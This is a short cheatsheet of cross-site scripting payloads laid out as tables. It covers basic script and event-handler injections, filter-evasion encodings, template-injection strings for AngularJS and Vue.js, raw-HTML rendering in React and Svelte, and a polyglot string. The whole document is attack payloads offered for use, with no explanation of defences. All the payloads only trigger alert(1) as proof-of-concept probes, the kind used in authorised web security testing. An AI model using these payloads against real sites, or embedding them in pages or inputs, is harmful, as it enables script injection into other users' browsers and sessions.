# XSS Cheatsheet

## Basic Payloads

| Scenario | Payload |
| :--- | :--- |
| **No Filter** | `<script>alert(1)</script>` |
| **HTML Attribute** | `"><script>alert(1)</script>` |
| **Img Tag** | `<img src=x onerror=alert(1)>` |
| **Input Tag** | `<input onfocus=alert(1) autofocus>` |

## Filter Evasion

| Technique | Payload |
| :--- | :--- |
| **Case Insensitivity** | `<ScRiPt>alert(1)</sCrIpT>` |
| **URL Encoding** | `%3Cscript%3Ealert(1)%3C%2Fscript%3E` |
| **Double Encoding** | `%253Cscript%253Ealert(1)%253C%252Fscript%253E` |
| **Null Byte** | `<script>%00alert(1)</script>` |

## Framework Injection

| Framework | Payload |
| :--- | :--- |
| **AngularJS** | `{{constructor.constructor('alert(1)')()}}` |
| **Vue.js** | `{{_openBlock.constructor('alert(1)')()}}` |
| **React** | `<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}} />` |
| **Svelte** | `{@html "<img src=x onerror=alert(1)>"}` |

## Polyglots

`javascript://%250Aalert(1)//" onmouseover=alert(1) //'>"><script>alert(1)</script>`
